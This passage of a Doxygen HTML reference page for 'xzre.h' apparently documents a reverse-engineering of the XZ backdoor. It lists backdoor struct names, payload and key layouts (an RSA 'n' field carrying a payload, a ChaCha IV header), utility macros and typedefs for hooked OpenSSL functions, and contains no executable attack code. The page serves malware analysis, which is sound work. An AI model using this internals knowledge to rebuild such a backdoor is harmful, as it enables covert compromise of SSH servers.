<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.9.1"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>xzre: xzre.h File Reference</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">xzre
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.1 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:cf05388f2679ee054f2beb29a391d25f4e673ac3&amp;dn=gpl-2.0.txt GPL-v2 */
var searchBox = new SearchBox("searchBox", "search",false,'Search','.html');
/* @license-end */
</script>
<script type="text/javascript" src="menudata.js"></script>
<script type="text/javascript" src="menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:cf05388f2679ee054f2beb29a391d25f4e673ac3&amp;dn=gpl-2.0.txt GPL-v2 */
$(function() {
  initMenu('',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */</script>
<div id="main-nav"></div>
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

</div><!-- top -->
<div class="header">
  <div class="summary">
<a href="#nested-classes">Data Structures</a> &#124;
<a href="#define-members">Macros</a> &#124;
<a href="#typedef-members">Typedefs</a> &#124;
<a href="#enum-members">Enumerations</a> &#124;
<a href="#func-members">Functions</a> &#124;
<a href="#var-members">Variables</a>  </div>
  <div class="headertitle">
<div class="title">xzre.h File Reference</div>  </div>
</div><!--header-->
<div class="contents">

<p>XZ backdoor structures and functions.  
<a href="#details">More...</a></p>
<div class="textblock"><code>#include &lt;assert.h&gt;</code><br />
<code>#include &lt;stddef.h&gt;</code><br />
<code>#include &lt;stdint.h&gt;</code><br />
<code>#include &lt;sys/select.h&gt;</code><br />
<code>#include &lt;lzma.h&gt;</code><br />
<code>#include &lt;openssl/dsa.h&gt;</code><br />
<code>#include &lt;openssl/ec.h&gt;</code><br />
<code>#include &lt;openssl/evp.h&gt;</code><br />
<code>#include &lt;openssl/rsa.h&gt;</code><br />
<code>#include &lt;elf.h&gt;</code><br />
<code>#include &lt;link.h&gt;</code><br />
<code>#include &quot;util.h&quot;</code><br />
</div>
<p><a href="xzre_8h_source.html">Go to the source code of this file.</a></p>
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="nested-classes"></a>
Data Structures</h2></td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structdasm__ctx.html">dasm_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__info.html">elf_info</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structlibc__imports.html">libc_imports</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structimported__funcs.html">imported_funcs</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshd__ctx.html">sshd_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structsshd__log__ctx.html">sshd_log_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structglobal__context.html">global_context</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structldso__ctx.html">ldso_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__handles.html">elf_handles</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">array of ELF handles  <a href="structelf__handles.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structmain__elf.html">main_elf</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__data__handle.html">backdoor_data_handle</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">data passed to functions that access the backdoor data  <a href="structbackdoor__data__handle.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structstring__item.html">string_item</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structstring__references.html">string_references</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__data.html">backdoor_data</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">this structure is used to hold most of the backdoor information. it's used as a local variable in function <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423">backdoor_setup</a>  <a href="structbackdoor__data.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">union &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">represents a shift register, which will shift a '1' into the secret data array. the low 3 bits represent the bit index, while the rest represents the byte index this is convenient, since a simple increment will increment the buffer position correctly  <a href="unionsecret__data__shift__cursor__t.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__payload__hdr.html">key_payload_hdr</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">the payload header. also used as Chacha IV  <a href="structkey__payload__hdr.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__payload__body.html">key_payload_body</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__payload.html">key_payload</a></td></tr>
<tr class="memdesc:"><td class="mdescLeft">&#160;</td><td class="mdescRight">the contents of the RSA 'n' field  <a href="structkey__payload.html#details">More...</a><br /></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">union &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="unionu__cmd__arguments__t.html">u_cmd_arguments_t</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structcmd__arguments.html">cmd_arguments</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structkey__ctx.html">key_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structbackdoor__tls__get__addr__reloc__consts.html">backdoor_tls_get_addr_reloc_consts</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structelf__functions.html">elf_functions</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structinstruction__search__ctx.html">instruction_search_ctx</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="define-members"></a>
Macros</h2></td></tr>
<tr class="memitem:ab00cb4aeb1653ec4164170204142f57e"><td class="memItemLeft" align="right" valign="top"><a id="ab00cb4aeb1653ec4164170204142f57e"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>UPTR</b>(x)&#160;&#160;&#160;((uptr)(x))</td></tr>
<tr class="separator:ab00cb4aeb1653ec4164170204142f57e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac8b325ef6e0fe3c944a4847a4b1f96c9"><td class="memItemLeft" align="right" valign="top"><a id="ac8b325ef6e0fe3c944a4847a4b1f96c9"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PTRADD</b>(a,  b)&#160;&#160;&#160;(UPTR(a) + UPTR(b))</td></tr>
<tr class="separator:ac8b325ef6e0fe3c944a4847a4b1f96c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a39ad72fe76265f5bc6cc25a95b54e2cd"><td class="memItemLeft" align="right" valign="top"><a id="a39ad72fe76265f5bc6cc25a95b54e2cd"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PTRDIFF</b>(a,  b)&#160;&#160;&#160;(UPTR(a) - UPTR(b))</td></tr>
<tr class="separator:a39ad72fe76265f5bc6cc25a95b54e2cd"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab57fd92ea606d15c3291e6bc0396c8af"><td class="memItemLeft" align="right" valign="top"><a id="ab57fd92ea606d15c3291e6bc0396c8af"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>BUILD_BUG_ON_ZERO</b>(e)&#160;&#160;&#160;((int)(sizeof(struct { int:(-!!(e)); })))</td></tr>
<tr class="separator:ab57fd92ea606d15c3291e6bc0396c8af"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a450aeb766a9af43aa7f9faf1279c8c8f"><td class="memItemLeft" align="right" valign="top"><a id="a450aeb766a9af43aa7f9faf1279c8c8f"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>__same_type</b>(a,  b)&#160;&#160;&#160;__builtin_types_compatible_p(typeof(a), typeof(b))</td></tr>
<tr class="separator:a450aeb766a9af43aa7f9faf1279c8c8f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1f27072e3a686ca053626f23d2551457"><td class="memItemLeft" align="right" valign="top"><a id="a1f27072e3a686ca053626f23d2551457"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>__must_be_array</b>(a)&#160;&#160;&#160;BUILD_BUG_ON_ZERO(__same_type((a), &amp;(a)[0]))</td></tr>
<tr class="separator:a1f27072e3a686ca053626f23d2551457"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3c7c6a69f690fc8d2abf0e385280a532"><td class="memItemLeft" align="right" valign="top"><a id="a3c7c6a69f690fc8d2abf0e385280a532"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>ARRAY_SIZE</b>(arr)&#160;&#160;&#160;(sizeof(arr) / sizeof((arr)[0]) + __must_be_array(arr))</td></tr>
<tr class="separator:a3c7c6a69f690fc8d2abf0e385280a532"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1974ecd89574bc861c90392b3d570dcb"><td class="memItemLeft" align="right" valign="top"><a id="a1974ecd89574bc861c90392b3d570dcb"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>XZDASM_OPC</b>(op)&#160;&#160;&#160;(op - 0x80)</td></tr>
<tr class="separator:a1974ecd89574bc861c90392b3d570dcb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa8cecfc5c5c054d2875c03e77b7be15d"><td class="memItemLeft" align="right" valign="top"><a id="aa8cecfc5c5c054d2875c03e77b7be15d"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>TRUE</b>&#160;&#160;&#160;1</td></tr>
<tr class="separator:aa8cecfc5c5c054d2875c03e77b7be15d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa93f0eb578d23995850d61f7d61c55c1"><td class="memItemLeft" align="right" valign="top"><a id="aa93f0eb578d23995850d61f7d61c55c1"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>FALSE</b>&#160;&#160;&#160;0</td></tr>
<tr class="separator:aa93f0eb578d23995850d61f7d61c55c1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa5fd0af1f78d21cfc6f8c25bef9f14bc"><td class="memItemLeft" align="right" valign="top"><a id="aa5fd0af1f78d21cfc6f8c25bef9f14bc"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b>(t,  f,  o)&#160;&#160;&#160;static_assert(offsetof(t, f) == o)</td></tr>
<tr class="separator:aa5fd0af1f78d21cfc6f8c25bef9f14bc"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2f18db18bca26cafa95e9719de4a41ef"><td class="memItemLeft" align="right" valign="top"><a id="a2f18db18bca26cafa95e9719de4a41ef"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>CONCAT</b>(x,  y)&#160;&#160;&#160;x ## y</td></tr>
<tr class="separator:a2f18db18bca26cafa95e9719de4a41ef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5af923cb05ed3e3ff98866990b79752d"><td class="memItemLeft" align="right" valign="top"><a id="a5af923cb05ed3e3ff98866990b79752d"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>EXPAND</b>(x,  y)&#160;&#160;&#160;CONCAT(x, y)</td></tr>
<tr class="separator:a5af923cb05ed3e3ff98866990b79752d"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a353d32e52768fa413b9d1f381a201efa"><td class="memItemLeft" align="right" valign="top"><a id="a353d32e52768fa413b9d1f381a201efa"></a>
#define&#160;</td><td class="memItemRight" valign="bottom"><b>PADDING</b>(size)&#160;&#160;&#160;u8 EXPAND(_unknown, __LINE__)[size]</td></tr>
<tr class="separator:a353d32e52768fa413b9d1f381a201efa"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="typedef-members"></a>
Typedefs</h2></td></tr>
<tr class="memitem:a92c50087ca0e64fa93fc59402c55f8ca"><td class="memItemLeft" align="right" valign="top"><a id="a92c50087ca0e64fa93fc59402c55f8ca"></a>
typedef uint8_t&#160;</td><td class="memItemRight" valign="bottom"><b>u8</b></td></tr>
<tr class="separator:a92c50087ca0e64fa93fc59402c55f8ca"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace9d960e74685e2cd84b36132dbbf8aa"><td class="memItemLeft" align="right" valign="top"><a id="ace9d960e74685e2cd84b36132dbbf8aa"></a>
typedef uint16_t&#160;</td><td class="memItemRight" valign="bottom"><b>u16</b></td></tr>
<tr class="separator:ace9d960e74685e2cd84b36132dbbf8aa"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afaa62991928fb9fb18ff0db62a040aba"><td class="memItemLeft" align="right" valign="top"><a id="afaa62991928fb9fb18ff0db62a040aba"></a>
typedef uint32_t&#160;</td><td class="memItemRight" valign="bottom"><b>u32</b></td></tr>
<tr class="separator:afaa62991928fb9fb18ff0db62a040aba"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3f7e2bcbb0b4c338f3c4f6c937cd4234"><td class="memItemLeft" align="right" valign="top"><a id="a3f7e2bcbb0b4c338f3c4f6c937cd4234"></a>
typedef uint64_t&#160;</td><td class="memItemRight" valign="bottom"><b>u64</b></td></tr>
<tr class="separator:a3f7e2bcbb0b4c338f3c4f6c937cd4234"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a93a1409151dffdb2c15147214279817a"><td class="memItemLeft" align="right" valign="top"><a id="a93a1409151dffdb2c15147214279817a"></a>
typedef uintptr_t&#160;</td><td class="memItemRight" valign="bottom"><b>uptr</b></td></tr>
<tr class="separator:a93a1409151dffdb2c15147214279817a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a74c374136cf9a969dde2585536c808ac"><td class="memItemLeft" align="right" valign="top"><a id="a74c374136cf9a969dde2585536c808ac"></a>
typedef Elf64_Xword&#160;</td><td class="memItemRight" valign="bottom"><b>Elf64_Relr</b></td></tr>
<tr class="separator:a74c374136cf9a969dde2585536c808ac"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a050c65e107f0c828f856a231f4b4e788"><td class="memItemLeft" align="right" valign="top"><a id="a050c65e107f0c828f856a231f4b4e788"></a>
typedef int&#160;</td><td class="memItemRight" valign="bottom"><b>BOOL</b></td></tr>
<tr class="separator:a050c65e107f0c828f856a231f4b4e788"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a73f7e784872b0e3c60100a8f231b0636"><td class="memItemLeft" align="right" valign="top"><a id="a73f7e784872b0e3c60100a8f231b0636"></a>
typedef struct <a class="el" href="structelf__entry__ctx.html">elf_entry_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>elf_entry_ctx_t</b></td></tr>
<tr class="separator:a73f7e784872b0e3c60100a8f231b0636"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aad5c5afe5d33be79e6466010cdba5c78"><td class="memItemLeft" align="right" valign="top"><a id="aad5c5afe5d33be79e6466010cdba5c78"></a>
typedef struct <a class="el" href="structdasm__ctx.html">dasm_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>dasm_ctx_t</b></td></tr>
<tr class="separator:aad5c5afe5d33be79e6466010cdba5c78"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a958fbc6aa42d63f2a2fd296bf0e586e4"><td class="memItemLeft" align="right" valign="top"><a id="a958fbc6aa42d63f2a2fd296bf0e586e4"></a>
typedef struct <a class="el" href="structelf__info.html">elf_info</a>&#160;</td><td class="memItemRight" valign="bottom"><b>elf_info_t</b></td></tr>
<tr class="separator:a958fbc6aa42d63f2a2fd296bf0e586e4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa318f8aef631765be09c477436487c54"><td class="memItemLeft" align="right" valign="top"><a id="aa318f8aef631765be09c477436487c54"></a>
typedef struct <a class="el" href="structlibc__imports.html">libc_imports</a>&#160;</td><td class="memItemRight" valign="bottom"><b>libc_imports_t</b></td></tr>
<tr class="separator:aa318f8aef631765be09c477436487c54"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:adecb5c6743212f467a1dcb1137b9a068"><td class="memItemLeft" align="right" valign="top"><a id="adecb5c6743212f467a1dcb1137b9a068"></a>
typedef int(*&#160;</td><td class="memItemRight" valign="bottom"><b>pfn_RSA_public_decrypt_t</b>) (int flen, unsigned char *from, unsigned char *to, RSA *rsa, int padding)</td></tr>
<tr class="separator:adecb5c6743212f467a1dcb1137b9a068"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9942af087add10a0724704291e65c8f0"><td class="memItemLeft" align="right" valign="top"><a id="a9942af087add10a0724704291e65c8f0"></a>
typedef int(*&#160;</td><td class="memItemRight" valign="bottom"><b>pfn_EVP_PKEY_set1_RSA_t</b>) (EVP_PKEY *pkey, struct rsa_st *key)</td></tr>
<tr class="separator:a9942af087add10a0724704291e65c8f0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5e48c0241cc79ff63678f8ea3245e89b"><td class="memItemLeft" align="right" valign="top"><a id="a5e48c0241cc79ff63678f8ea3245e89b"></a>
typedef void(*&#160;</td><td class="memItemRight" valign="bottom"><b>pfn_RSA_get0_key_t</b>) (const RSA *r, const BIGNUM **n, const BIGNUM **e, const BIGNUM **d)</td></tr>
<tr class="separator:a5e48c0241cc79ff63678f8ea3245e89b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ff2f73b261edf1b4c22574b8bc6622e"><td class="memItemLeft" align="right" valign="top"><a id="a6ff2f73b261edf1b4c22574b8bc6622e"></a>
typedef struct <a class="el" href="structimported__funcs.html">imported_funcs</a>&#160;</td><td class="memItemRight" valign="bottom"><b>imported_funcs_t</b></td></tr>
<tr class="separator:a6ff2f73b261edf1b4c22574b8bc6622e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9daa34d6565ffe5f55796b4725f934c9"><td class="memItemLeft" align="right" valign="top"><a id="a9daa34d6565ffe5f55796b4725f934c9"></a>
typedef struct <a class="el" href="structsshd__ctx.html">sshd_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_ctx_t</b></td></tr>
<tr class="separator:a9daa34d6565ffe5f55796b4725f934c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6f86f3a8bd5ba030a9f53f298b22ef00"><td class="memItemLeft" align="right" valign="top"><a id="a6f86f3a8bd5ba030a9f53f298b22ef00"></a>
typedef struct <a class="el" href="structsshd__log__ctx.html">sshd_log_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>sshd_log_ctx_t</b></td></tr>
<tr class="separator:a6f86f3a8bd5ba030a9f53f298b22ef00"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2390d675ac7d2f897005a15e2564c755"><td class="memItemLeft" align="right" valign="top"><a id="a2390d675ac7d2f897005a15e2564c755"></a>
typedef struct <a class="el" href="structglobal__context.html">global_context</a>&#160;</td><td class="memItemRight" valign="bottom"><b>global_context_t</b></td></tr>
<tr class="separator:a2390d675ac7d2f897005a15e2564c755"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6c5124b08f8bc7830d5b4d737fbd605e"><td class="memItemLeft" align="right" valign="top"><a id="a6c5124b08f8bc7830d5b4d737fbd605e"></a>
typedef struct <a class="el" href="structbackdoor__shared__globals.html">backdoor_shared_globals</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_shared_globals_t</b></td></tr>
<tr class="separator:a6c5124b08f8bc7830d5b4d737fbd605e"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af35dcaf62ea5454989cdb109286a4afa"><td class="memItemLeft" align="right" valign="top"><a id="af35dcaf62ea5454989cdb109286a4afa"></a>
typedef struct <a class="el" href="structldso__ctx.html">ldso_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>ldso_ctx_t</b></td></tr>
<tr class="separator:af35dcaf62ea5454989cdb109286a4afa"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6bdb9d6365136f6f9cefd4ba841ae308"><td class="memItemLeft" align="right" valign="top"><a id="a6bdb9d6365136f6f9cefd4ba841ae308"></a>
typedef struct <a class="el" href="structbackdoor__hooks__data.html">backdoor_hooks_data</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_hooks_data_t</b></td></tr>
<tr class="separator:a6bdb9d6365136f6f9cefd4ba841ae308"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6f9a74cf91da7432a6404333a7658fbf"><td class="memItemLeft" align="right" valign="top"><a id="a6f9a74cf91da7432a6404333a7658fbf"></a>
typedef struct <a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_hooks_ctx_t</b></td></tr>
<tr class="separator:a6f9a74cf91da7432a6404333a7658fbf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae0c3110b1c8c437dac9dbe0220812d76"><td class="memItemLeft" align="right" valign="top"><a id="ae0c3110b1c8c437dac9dbe0220812d76"></a>
typedef struct <a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params</a>&#160;</td><td class="memItemRight" valign="bottom"><b>backdoor_setup_params_t</b></td></tr>
<tr class="separator:ae0c3110b1c8c437dac9dbe0220812d76"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a65ea88969746c06d6c0d0b1586f610db"><td class="memItemLeft" align="right" valign="top">typedef struct <a class="el" href="structelf__handles.html">elf_handles</a>&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">elf_handles_t</a></td></tr>
<tr class="memdesc:a65ea88969746c06d6c0d0b1586f610db"><td class="mdescLeft">&#160;</td><td class="mdescRight">array of ELF handles  <a href="xzre_8h.html#a65ea88969746c06d6c0d0b1586f610db">More...</a><br /></td></tr>
<tr class="separator:a65ea88969746c06d6c0d0b1586f610db"><td class="memSeparator" colspan="2">&#160;</td></tr>
